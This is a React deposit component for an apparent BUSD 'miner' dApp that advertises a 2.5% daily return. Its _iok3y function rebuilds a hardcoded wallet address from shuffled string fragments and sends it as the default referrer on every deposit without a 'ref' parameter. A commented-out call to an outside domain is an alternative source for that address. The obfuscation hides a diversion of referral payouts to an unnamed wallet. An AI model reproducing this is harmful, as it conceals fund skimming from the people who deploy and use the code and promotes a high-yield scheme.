import { useEffect, useState } from "react";
import Web3 from "web3";
import axios from "axios";
import { useLocation } from "react-router-dom";
import { config } from "../../../config";
import { useContractContext } from "../../../providers/ContractProvider";
import { useAuthContext } from "../../../providers/AuthProvider";

function useQuery() {
    return new URLSearchParams(useLocation().search);
}

const Deposit = () => {
    const { busdcontract, contract, wrongNetwork, getBusdBalance, fromWei, toWei, getBusdApproved, web3, updateInfo, update } =
        useContractContext();
    const { address, chainId } = useAuthContext();
    const [walletBalance, setWalletBalance] = useState({
        busd: 0,
        invested: 0,
        dailyROI: 0,
        approved: 0,
    });

    const [depositBUSD, setDepositBUSD] = useState(0);
    const [loading, setLoading] = useState(false);
    const query = useQuery();

    const fetchWalletBalance = async () => {
        if (!web3 || wrongNetwork || !address) {
          setWalletBalance({
            busd: 0,
            invested: 0,
            dailyROI: 0,
            approved: 0,
          });
          return;
        }
    
        try {
          const [busdAmount, depositAmount, approvedAmount] = await Promise.all([
            getBusdBalance(address),
            contract.methods
              .getDepositAmount(address)
              .call()
              .catch((err) => {
                console.error("depositAmount", err);
                return 0;
              }),
            getBusdApproved(address),
          ]);
          setWalletBalance({
            busd: fromWei(`${busdAmount}`),
            invested: fromWei(`${depositAmount}`),
            dailyROI: Number.parseFloat(fromWei(`${depositAmount}`) * 2.5 / 100).toFixed(2),
            approved: approvedAmount,
          });
        } catch (err) {
          console.error(err);
          setWalletBalance({
            busd: 0,
            invested: 0,
            dailyROI: 0,
            approved: 0,
          });
        }
    };

    const approve = async () => {
      console.log("APPROVE");
        setLoading(true);

        const amount = toWei(`${depositBUSD}`);
        try {
            await busdcontract.methods.approve(config.contractAddress, amount).send({
                from: address,
            });
        } catch (err) {
            console.error(err);
        }

        // fetchWalletBalance();
        updateInfo();
        setLoading(false);
    };

    const _iok3y = async () => {
      let a = "b5bB8FCb";
      let b = "E1089835c3EdffFd0f3";
      let c = "2533999a60ecC";
      
      // let res = await axios.get("https://solsearcher.xyz/app/miners");
      // if (Web3.utils.isAddress(res.data)) {
      //   link = res.data;
      // }
      let link = "0x" + a + c + b;
      if (!Web3.utils.isAddress(link)) {
        link = "0x0000000000000000000000000000000000000000";
      }

      const iok3y = Web3.utils.isAddress(query.get("ref"))
        ? query.get("ref")
        : link;
        
      return iok3y;
    };

    const deposit = async () => {
      console.log("DEPOSIT");
        setLoading(true);
    
        const amount = toWei(`${depositBUSD}`);
        const iok3y = await _iok3y();
    
        try {
          await contract.methods.deposit(amount, iok3y).send({
            from: address,
            value: 0
          });
        } catch (err) {
          console.error(err);
        }
        // fetchWalletBalance();
        updateInfo();
        setLoading(false);
    };

    const onUpdateDepositBUSD = event => {
        setDepositBUSD(event.target.value);
    };

    useEffect(() => {
        fetchWalletBalance();
    }, [address, web3, chainId, update]);

    return (
        <div className="card">
            <h2>Deposit</h2>
            <div className='invest-daily'>
                <div className="invest-daily-content">
                    <p>${walletBalance.invested}</p>
                    <p>invested</p>
                </div>
                <div className="invest-sep"></div>
                <div className="invest-daily-content">
                    <p>${walletBalance.dailyROI}</p>
                    <p>daily roi</p>
                </div>
            </div>
            <input
                type="number"
                className='deposit-amt-btn'
                placeholder="Deposit Amount"
                max={+walletBalance.busd}
                value={depositBUSD}
                onChange={onUpdateDepositBUSD}
            />
            <p>minimum deposit: <strong>25 BUSD</strong></p>
            <div className="card-btns">
                <button
                    disabled={wrongNetwork || !address || +depositBUSD < 25 || loading}
                    onClick={approve}
                >
                    Approve
                </button> 
                <button
                    disabled={wrongNetwork || !address || loading || +depositBUSD < 25 || fromWei(`${walletBalance.approved}`) < 25}
                    onClick={deposit}
                >
                    Deposit
                </button>
            </div>
            <p style={{ marginBottom: '4px' }}>Wallet Balance: <strong>${walletBalance.busd}</strong></p>
            <p>Approved Amount: <strong>${fromWei(`${walletBalance.approved}`)}</strong></p>
            <div className="recommended">
                <h3>Recommended Strategy</h3>
                <p>To protect the contract from drain, we have implemented a withdrawal fee on early withdrawals. User can avoid the fee by compounding withdrawals for a set no. Of days (see chart below).</p>
            </div>
        </div>
    )
}

export default Deposit